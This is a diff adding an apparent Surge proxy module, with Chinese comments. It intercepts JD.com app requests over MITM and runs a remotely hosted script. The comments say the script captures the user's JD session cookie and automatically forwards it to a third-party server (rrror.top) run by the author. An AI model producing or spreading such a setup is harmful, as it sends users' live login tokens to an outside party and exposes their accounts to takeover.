@@ -1,0 +1,18 @@
+#!name=京东cookie发送到青龙api服务器
+#!desc=api服务器由我自己 tg：@gdot0 提供
+//说明：cookie获取通知·优化通知+api服务器：魔改自js文件：https://raw.githubusercontent.com/Lxi0707/Scripts/refs/heads/X/pt_key.js
+
+//说明：优化getcookie的通知，保存cookie至boxjs的可持续化数据，可以通过scriptable小组件进行实时更新以及显示，自动将cookie发送至青龙api服务器：http://rrror.top (每次打开京东app即可获取cookie）
+
+//因为将JDcookie保存至本地的boxjs，因此可以调用小组件scriptable，由茅台佬提供的小组件可以调用此cookie，魔改版本（cookie失效自动从boxjs更新）：https://raw.githubusercontent.com/randomshit699/surge/refs/heads/main/JD/京东京豆显示美化+优化.scriptable
+//
+
+
+[Script]
+
+#cookie获取通知·优化通知+api服务器
+🍎a-JD_pt_key = type=http-request, pattern=^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig), script-path=https://raw.githubusercontent.com/randomshit699/surge/refs/heads/main/JD/JDcookie.js
+
+[MITM]
+
+hostname = %APPEND% in.m.jd.com
